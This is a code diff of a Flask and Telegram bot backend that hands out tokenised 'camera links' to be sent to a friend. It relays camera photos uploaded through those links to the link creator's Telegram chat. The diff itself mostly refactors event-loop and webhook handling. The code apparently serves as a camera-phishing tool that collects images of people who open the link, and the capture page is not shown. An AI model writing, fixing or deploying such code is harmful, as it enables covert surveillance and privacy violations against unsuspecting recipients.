@@ -2,6 +2,7 @@ import os
 import base64
 import uuid
 import asyncio
+import threading
 import psycopg2
 from datetime import datetime, timezone
 from flask import Flask, request, jsonify
@@ -19,8 +20,9 @@ DATABASE_URL = os.environ['DATABASE_URL']
 app = Flask(__name__)
 CORS(app)
 
+# Global event loop for Telegram
+main_loop = asyncio.new_event_loop()
 tg_app = None
-
 
 # ==================== DATABASE ====================
 def db_conn():
@@ -28,7 +30,6 @@ def db_conn():
     if url.startswith('postgres://'):
         url = url.replace('postgres://', 'postgresql://', 1)
     return psycopg2.connect(url)
-
 
 def init_token_db():
     try:
@@ -48,7 +49,6 @@ def init_token_db():
     except Exception as e:
         print(f"DB init error: {e}")
 
-
 def save_token(token, user_id):
     try:
         conn = db_conn()
@@ -65,7 +65,6 @@ def save_token(token, user_id):
     except Exception as e:
         print(f"Save token error: {e}")
 
-
 def get_token_user(token):
     try:
         conn = db_conn()
@@ -79,45 +78,48 @@ def get_token_user(token):
         print(f"Get token error: {e}")
         return None
 
-
 def token_exists(token):
     return get_token_user(token) is not None
 
+# ==================== BACKGROUND EVENT LOOP ====================
+def start_main_loop():
+    asyncio.set_event_loop(main_loop)
+    main_loop.run_forever()
+
+threading.Thread(target=start_main_loop, daemon=True).start()
 
 # ==================== BOT HANDLERS ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     u = update.effective_user
     keyboard = [[InlineKeyboardButton("🔗 Generate Link", callback_data='genlink')]]
     await update.message.reply_text(
-        f"👋 Hi {u.first_name or 'User'}!\n\n"
-        f"Tap to generate a camera link:",
+        f"👋 Hi {u.first_name or 'User'}!\n\nTap to generate a camera link:",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
-
 
 async def genlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     q = update.callback_query
     await q.answer()
-
     uid = q.from_user.id
     token = str(uuid.uuid4()).replace('-', '')[:12]
     save_token(token, uid)
-
     link = f"{SITE_URL}?token={token}"
-
     await q.edit_message_text(
-        f"🔗 Your Camera Link:\n\n"
-        f"{link}\n\n"
-        f"📤 Copy karke friend ko bhejo.",
+        f"🔗 Your Camera Link:\n\n{link}\n\n📤 Copy karke friend ko bhejo.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Open Link", url=link)]])
     )
 
+async def process_update(update_data):
+    global tg_app
+    if tg_app is None:
+        return
+    update = Update.de_json(update_data, tg_app.bot)
+    await tg_app.process_update(update)
 
 # ==================== FLASK ROUTES ====================
 @app.route('/', methods=['GET'])
 def health():
     return "OK", 200
-
 
 @app.route('/api/verify-token', methods=['POST'])
 def verify_token():
@@ -126,7 +128,6 @@ def verify_token():
     if token_exists(token):
         return jsonify({'valid': True})
     return jsonify({'valid': False}), 404
-
 
 @app.route('/api/upload', methods=['POST'])
 def upload_photo():
@@ -143,13 +144,9 @@ def upload_photo():
             image_b64 = image_b64.split(',')[1]
 
         image_bytes = base64.b64decode(image_b64)
-
         filename = f"/tmp/photo_{token}_{int(datetime.now().timestamp())}.jpg"
         with open(filename, 'wb') as f:
             f.write(image_bytes)
-
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
 
         async def send():
             bot = Bot(token=BOT_TOKEN)
@@ -158,64 +155,30 @@ def upload_photo():
                     await bot.send_photo(
                         chat_id=target_user,
                         photo=f,
-                        caption=f"📸 Photo received\n\n"
-                                f"🕐 {datetime.now().strftime('%d %b %Y, %I:%M %p')}"
+                        caption=f"📸 Photo received\n\n🕐 {datetime.now().strftime('%d %b %Y, %I:%M %p')}"
                     )
-
-        loop.run_until_complete(send())
-        loop.close()
+        
+        future = asyncio.run_coroutine_threadsafe(send(), main_loop)
+        future.result(timeout=30) # wait for it to finish
 
         try:
             os.remove(filename)
         except:
             pass
-
         return jsonify({'status': 'success'})
-
     except Exception as e:
         print(f"Upload error: {e}")
         return jsonify({'error': str(e)}), 500
 
-
-# ==================== WEBHOOK ====================
 @app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
 def webhook():
     try:
         update_data = request.get_json(force=True)
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-
-        async def process():
-            if tg_app is None:
-                return
-            update = Update.de_json(update_data, tg_app.bot)
-            await tg_app.initialize()
-            await tg_app.process_update(update)
-
-        loop.run_until_complete(process())
-        loop.close()
+        # Send to background loop instead of creating a new one
+        asyncio.run_coroutine_threadsafe(process_update(update_data), main_loop)
     except Exception as e:
         print(f"Webhook error: {e}")
     return "OK", 200
-
-
-# ==================== SETUP WEBHOOK ====================
-def set_telegram_webhook():
-    if not RENDER_URL:
-        print("RENDER_EXTERNAL_URL not set")
-        return
-    import requests
-    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
-    try:
-        r = requests.get(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook",
-            params={'url': webhook_url, 'drop_pending_updates': 'true'},
-            timeout=15
-        )
-        print(f"Webhook set: {r.json()}")
-    except Exception as e:
-        print(f"Webhook setup failed: {e}")
-
 
 # ==================== MAIN ====================
 if __name__ == '__main__':
@@ -225,8 +188,23 @@ if __name__ == '__main__':
     tg_app.add_handler(CommandHandler('start', start))
     tg_app.add_handler(CallbackQueryHandler(genlink, pattern='genlink'))
 
+    # Initialize bot in background loop
+    asyncio.run_coroutine_threadsafe(tg_app.initialize(), main_loop)
+    asyncio.run_coroutine_threadsafe(tg_app.start(), main_loop)
+
     print("🤖 Bot initialized (PostgreSQL mode)")
 
-    set_telegram_webhook()
+    if RENDER_URL:
+        import requests
+        webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
+        try:
+            r = requests.get(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook",
+                params={'url': webhook_url, 'drop_pending_updates': 'true'},
+                timeout=15
+            )
+            print(f"Webhook set: {r.json()}")
+        except Exception as e:
+            print(f"Webhook setup failed: {e}")
 
     app.run(host='0.0.0.0', port=PORT)
